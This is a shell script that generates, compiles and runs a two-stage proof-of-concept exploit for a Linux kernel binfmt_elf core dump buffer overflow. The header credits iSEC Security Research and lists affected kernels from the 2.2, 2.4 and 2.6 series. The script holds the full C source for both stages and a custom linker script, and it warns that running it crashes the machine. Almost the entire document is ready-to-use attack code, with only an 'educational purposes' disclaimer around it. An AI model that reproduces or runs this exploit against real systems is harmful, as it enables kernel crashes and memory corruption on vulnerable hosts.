#!/bin/bash
#
# elfcd.sh
# warning: This code will crash your machine
#
cat <<__EOF__>elfcd1.c
/*
 *	Linux binfmt_elf core dump buffer overflow
 *
 *	Copyright (c) 2005  iSEC Security Research. All Rights Reserved.
 *2.2 up to and including 2.2.27-rc2, 2.4 up to and including
    *       2.4.29, 2.6 up to and including 2.6.11
 *	THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 *	AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 *	WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */
//	phase 1
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

#include <sys/time.h>
#include <sys/resource.h>

#include <asm/page.h>


static char *env[10], *argv[4];
static char page[PAGE_SIZE];
static char buf[PAGE_SIZE];


void fatal(const char *msg)
{
	if(!errno) {
		fprintf(stderr, "\nFATAL: %s\n", msg);
	}
	else {
		printf("\n");
		perror(msg);
	}
	fflush(stdout); fflush(stderr);
	_exit(129);
}


int main(int ac, char **av)
{
int esp, i, r;
struct rlimit rl;

	__asm__("movl %%esp, %0" : : "m"(esp));
	printf("\n[+] %s argv_start=%p argv_end=%p  ESP: 0x%x", av[0], av[0], av[ac-1]+strlen(av[ac-1]), esp);
	rl.rlim_cur = RLIM_INFINITY;
	rl.rlim_max = RLIM_INFINITY;
	r = setrlimit(RLIMIT_CORE, &rl);
	if(r) fatal("setrlimit");

	memset(env, 0, sizeof(env) );
	memset(argv, 0, sizeof(argv) );
	memset(page, 'A', sizeof(page) );
	page[PAGE_SIZE-1]=0;

//	move up env & exec phase 2
	if(!strcmp(av[0], "AAAA")) {
		printf("\n[+] phase 2, <RET> to crash "); fflush(stdout);
		argv[0] = "elfcd2";
		argv[1] = page;

//	term 0 counts!
		memset(buf, 0, sizeof(buf) );
		for(i=0; i<789 + 4; i++)
			buf[i] = 'C';
		argv[2] = buf;
		execve(argv[0], argv, env);
		_exit(127);
	}

//	move down env & reexec
	for(i=0; i<9; i++)
		env[i] = page;

	argv[0] = "AAAA";
	printf("\n[+] phase 1"); fflush(stdout);
	execve(av[0], argv, env);

return 0;
}
__EOF__
cat <<__EOF__>elfcd2.c
//	phase 2
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syscall.h>

#include <sys/syscall.h>

#include <asm/page.h>

#define __NR_sys_read		__NR_read
#define __NR_sys_kill		__NR_kill
#define __NR_sys_getpid		__NR_getpid


char stack[4096 * 6];
static int errno;


inline _syscall3(int, sys_read, int, a, void*, b, int, l);
inline _syscall2(int, sys_kill, int, c, int, a);
inline _syscall0(int, sys_getpid);


//	yeah, lets do it
void killme()
{
char c='a';
int pid;

	pid = sys_getpid();
	for(;;) {
		sys_read(0, &c, 1);
		sys_kill(pid, 11);
	}
}


//	safe stack stub
__asm__(
	"		nop				\n"
	"_start:	movl 	\$0xbfff6ffc, %esp	\n"
	"		jmp 	killme			\n"
	".global 	_start				\n"
);
__EOF__
cat <<__EOF__>elfcd.ld
OUTPUT_FORMAT("elf32-i386", "elf32-i386",
              "elf32-i386")
OUTPUT_ARCH(i386)
ENTRY(_start)
SEARCH_DIR(/lib); SEARCH_DIR(/usr/lib); SEARCH_DIR(/usr/local/lib); SEARCH_DIR(/usr/i486-suse-linux/lib);

MEMORY
{
  ram (rwxali) : ORIGIN = 0xbfff0000, LENGTH = 0x8000
  rom (x) : ORIGIN = 0xbfff8000, LENGTH = 0x10000
}

PHDRS
{
  headers PT_PHDR PHDRS ;
  text PT_LOAD FILEHDR PHDRS ;
  fuckme PT_LOAD AT (0xbfff8000) FLAGS (0x00) ;
}

SECTIONS
{

  .dupa 0xbfff8000 : AT (0xbfff8000) { LONG(0xdeadbeef); _bstart = . ; . += 0x7000; } >rom :fuckme

  . = 0xbfff0000 + SIZEOF_HEADERS;
  .text : { *(.text) } >ram :text
  .data : { *(.data) } >ram :text
  .bss       :
  {
   *(.dynbss)
   *(.bss)
   *(.bss.*)
   *(.gnu.linkonce.b.*)
   *(COMMON)
   . = ALIGN(32 / 8);
  } >ram :text

}
__EOF__

# compile & run
echo -n "[+] Compiling..."
gcc -O2 -Wall elfcd1.c -o elfcd1
gcc -O2 -nostdlib elfcd2.c -o elfcd2 -Xlinker -T elfcd.ld -static
./elfcd1
